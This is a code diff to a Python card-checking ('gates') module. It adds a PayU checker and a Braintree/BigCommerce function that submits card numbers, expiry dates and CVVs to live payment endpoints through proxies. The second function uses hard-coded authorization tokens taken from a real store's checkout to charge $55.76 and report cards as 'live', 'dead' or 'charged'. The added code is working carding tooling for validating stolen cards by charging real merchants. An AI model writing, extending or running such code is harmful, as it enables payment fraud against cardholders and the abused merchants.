@@ -6,7 +6,10 @@ import aiohttp
 import random
 import re
 import json
-import uuid
+import time
+import base64
+import hashlib
+from uuid import uuid4
 from amazon_engine import AmazonEngine
 from hitter_engine import StripeHitter
 from bin_detector import get_bin_info as detect_bin
@@ -100,14 +103,72 @@ async def check_shopify(card: str, month: str, year: str, cvv: str, proxy=None) 
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "Shopify"}
 
-async def check_payu(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
-    """PayU India Gate"""
-    if not PAYU_MERCHANT_KEY:
-        return {"status": "error", "response": "PayU Key missing"}
-        
-    # PayU requires a server-side hash for checking
-    return {"status": "declined", "response": "PayU Hashing required", "gate": "PayU"}
+async def check_payu(card: str, month: str, year: str, cvv: str, proxy: str = None) -> dict:
+    """PayU Money Gate (Standard Flow)"""
+    if not PAYU_MERCHANT_KEY or not PAYU_MERCHANT_SALT:
+        return {"status": "error", "response": "PayU Config Missing", "gate": "PayU"}
 
+    try:
+        txnid = f"txn_{int(time.time())}_{random.randint(1000,9999)}"
+        amount = "10.00"
+        productinfo = "Premium Plan"
+        firstname = "Test"
+        email = "test@example.com"
+        
+        # Hash Sequence: key|txnid|amount|productinfo|firstname|email|udf1|udf2|...|udf10||||||salt
+        hash_str = f"{PAYU_MERCHANT_KEY}|{txnid}|{amount}|{productinfo}|{firstname}|{email}|||||||||||{PAYU_MERCHANT_SALT}"
+        hash_cal = hashlib.sha512(hash_str.encode('utf-8')).hexdigest()
+        
+        url = "https://secure.payu.in/_payment"
+        
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Referer": "https://secure.payu.in/"
+        }
+        
+        payload = {
+            "key": PAYU_MERCHANT_KEY,
+            "txnid": txnid,
+            "amount": amount,
+            "productinfo": productinfo,
+            "firstname": firstname,
+            "email": email,
+            "phone": "9999999999",
+            "hash": hash_cal,
+            "surl": "https://google.com",
+            "furl": "https://google.com",
+            "ccnum": card,
+            "ccexpmon": month,
+            "ccexpyr": year,
+            "cccvv": cvv,
+            "pg": "CC"
+        }
+
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, data=payload, headers=headers, proxy=proxy, timeout=30) as resp:
+                text = await resp.text()
+                url_final = str(resp.url)
+                
+                # Check for redirection to bank page (means card accepted by PayU)
+                if "secure.payu.in/_payment_options" in url_final or "payment_options" in text:
+                     return {"status": "live", "response": "Redirected to Bank (Live) ✅", "gate": "PayU"}
+                
+                if "error" in text.lower() or "failure" in text.lower():
+                     # Extract specific error if possible
+                     if "transaction failed" in text.lower():
+                         return {"status": "dead", "response": "Transaction Failed", "gate": "PayU"}
+                     return {"status": "dead", "response": "PayU Error", "gate": "PayU"}
+
+                # If redirected to SURL (Success)
+                if "google.com" in url_final:
+                    return {"status": "charged", "amount": amount, "response": "Charged Successfully 🔥", "gate": "PayU"}
+                
+                return {"status": "dead", "response": "Declined", "gate": "PayU"}
+
+    except Exception as e:
+        return {"status": "error", "response": str(e), "gate": "PayU"}
+        
 async def check_razorpay(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
     """Razorpay Auth Gate - Creates order and validates card (No charge)"""
     if not RZP_KEY_ID or not RZP_KEY_SECRET:
@@ -741,5 +802,115 @@ async def check_stripe_inbuilt(card: str, month: str, year: str, cvv: str, pk: s
 
 async def check_stripe_wc(c, m, y, cv, p=None): 
     return {"status": "declined", "response": "Fallback", "gate": "WC"}
+
+
+async def check_braintree_rotometals(card: str, month: str, year: str, cvv: str, proxy: str = None) -> dict:
+    """Braintree Charge $54 Gate - RotoMetals (Ported from B3_50$.php)"""
+    if len(year) == 2: year = "20" + year
+    
+    # 1. Tokenize Card
+    url1 = "https://payments.braintree-api.com/graphql"
+    headers1 = {
+        "authority": "payments.braintree-api.com",
+        "accept": "*/*",
+        "authorization": "Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjczMjg4NzMsImp0aSI6IjcxNmQ3ZDFhLTUyMDgtNDkzNy04YTdkLWY0OGYzZDg0NWI4OCIsInN1YiI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJhdWQiOlsicm90b21ldGFscy5jb20iLCJ3d3cucm90b21ldGFscy5jb20iXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyb3RvbWV0YWxzaW5jX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVZQVDYwNHV6VjEtM0o1MHNvUzVfYUtOWHliaDdmZEtCUHJFZk12QlJMS2MtbkxETjlINTI1bXF4cHFaSmd1R2pMUUREc0J1bW14UU9Bc1QifX0.MVV27c5bHYy-6PJ1Oo7S4uKqwuNPlpqXdaezIi5CwlzolgABxZYATBQ336jwTGOHjFXot4ZWldW8NDUhUTMdHA",
+        "braintree-version": "2018-05-10",
+        "content-type": "application/json",
+        "origin": "https://assets.braintreegateway.com",
+        "referer": "https://assets.braintreegateway.com/",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
+    }
+    
+    payload1 = {
+        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": "93c00f25-6747-4245-8000-e474c69c9b95"},
+        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
+        "variables": {
+            "input": {
+                "creditCard": {
+                    "number": card,
+                    "expirationMonth": month,
+                    "expirationYear": year,
+                    "cvv": cvv,
+                    "cardholderName": "james Kirkup",
+                    "billingAddress": {"countryName": "United States", "postalCode": "10080", "streetAddress": "Street 108"}
+                },
+                "options": {"validate": False}
+            }
+        },
+        "operationName": "TokenizeCreditCard"
+    }
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url1, json=payload1, headers=headers1, proxy=proxy, timeout=30) as resp1:
+                res1 = await resp1.json()
+                token = res1.get("data", {}).get("tokenizeCreditCard", {}).get("token")
+                
+                if not token:
+                    return {"status": "error", "response": "Tokenization Failed", "gate": "B3_50$"}
+
+            # 2. Charge via BigCommerce
+            url2 = "https://payments.bigcommerce.com/api/public/v1/orders/payments"
+            headers2 = {
+                "Accept": "application/json",
+                "Authorization": "JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcyNDgyOTMsIm5iZiI6MTc2NzI0NDY5MywiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDA2NTI4LCJqdGkiOiJiOWY5NjdmZS02NThlLTQ4ZGUtOTdiZC0wYjA5NzlhZDU5NDgiLCJpYXQiOjE3NjcyNDQ2OTMsImRhdGEiOnsic3RvcmVfaWQiOiIxMDA2NTI4Iiwib3JkZXJfaWQiOiIxODkxOTQiLCJhbW91bnQiOjU1NzYsImN1cnJlbmN5IjoiVVNEIiwic3RvcmVfdXJsIjoiaHR0cHM6Ly93d3cucm90b21ldGFscy5jb20iLCJmb3JtX2lkIjoidW5rbm93biIsInBheW1lbnRfY29udGV4dCI6ImNoZWNrb3V0IiwicGF5bWVudF90eXBlIjoiZWNvbW1lcmNlIn19.LQfiOMcFg41OwypueDC21-kSdAcY5G7xrH-HLqeGT78",
+                "Content-Type": "application/json",
+                "Origin": "https://www.rotometals.com",
+                "Referer": "https://www.rotometals.com/",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
+            }
+            
+            payload2 = {
+                "customer": {"geo_ip_country_code": "US", "session_token": "a0d9ef74fa622b6671c9be8164dc44b5ec72d111"},
+                "notify_url": "https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment",
+                "order": {
+                    "billing_address": {
+                        "city": "New York", "company": "Oxygen", "country_code": "US", "country": "United States",
+                        "first_name": "Fazil", "last_name": "Aggayz", "phone": "0665618205", "state_code": "NY",
+                        "state": "New York", "street_1": "Street 108", "zip": "10080", "email": "Binbhai000@gmail.com"
+                    },
+                    "coupons": [], "currency": "USD", "id": "189194",
+                    "items": [{"code": "90218d08-7f52-42f2-9691-e0e63ee98961", "variant_id": 1029, "name": "Antimony Shot ~1 Pound 99.6% Minimum Pure", "price": 4499, "unit_price": 4499, "quantity": 1, "sku": "ANTIMONYshotnew"}],
+                    "shipping": [{"method": "Flat rate <12\" items 7-18 days (7-18 days)"}],
+                    "shipping_address": {
+                        "city": "New York", "company": "Oxygen", "country_code": "US", "country": "United States",
+                        "first_name": "Fazil", "last_name": "Aggayz", "phone": "0665618205", "state_code": "NY",
+                        "state": "New York", "street_1": "Street 108", "zip": "10080"
+                    },
+                    "token": "ecfcbc28ddd43df523b2072497b76c58",
+                    "totals": {"grand_total": 5576, "handling": 0, "shipping": 1077, "subtotal": 4499, "tax": 0}
+                },
+                "payment": {
+                    "device_info": "{\"correlation_id\":\"93c00f25-6747-4245-8000-e474c69c\"}",
+                    "gateway": "braintree",
+                    "notify_url": "https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment",
+                    "vault_payment_instrument": False,
+                    "method": "credit-card",
+                    "credit_card_token": {"token": token}
+                },
+                "store": {"hash": "cra054", "id": "1006528", "name": "RotoMetals"}
+            }
+
+            async with session.post(url2, json=payload2, headers=headers2, proxy=proxy, timeout=30) as resp2:
+                text2 = await resp2.text()
+                
+                if "result\":\"success" in text2:
+                    return {"status": "charged", "amount": "$55.76", "response": "Charged $55.76 ✅", "gate": "B3_50$"}
+                
+                if "\"status\":\"error\"" in text2:
+                    # Extract error
+                    import re
+                    err_match = re.search(r'"code":"([^"]+)"', text2)
+                    err_msg = err_match.group(1) if err_match else "Declined"
+                    
+                    if "insufficient_funds" in text2 or "processor_declined" in text2:
+                        return {"status": "dead", "response": err_msg, "gate": "B3_50$"}
+                    
+                    return {"status": "dead", "response": err_msg, "gate": "B3_50$"}
+                
+                return {"status": "dead", "response": "Declined (Unknown Response)", "gate": "B3_50$"}
+
+    except Exception as e:
+        return {"status": "error", "response": str(e), "gate": "B3_50$"}
 
 print("✅ GATES.py UPDATED | Proxy & Charge logic added")
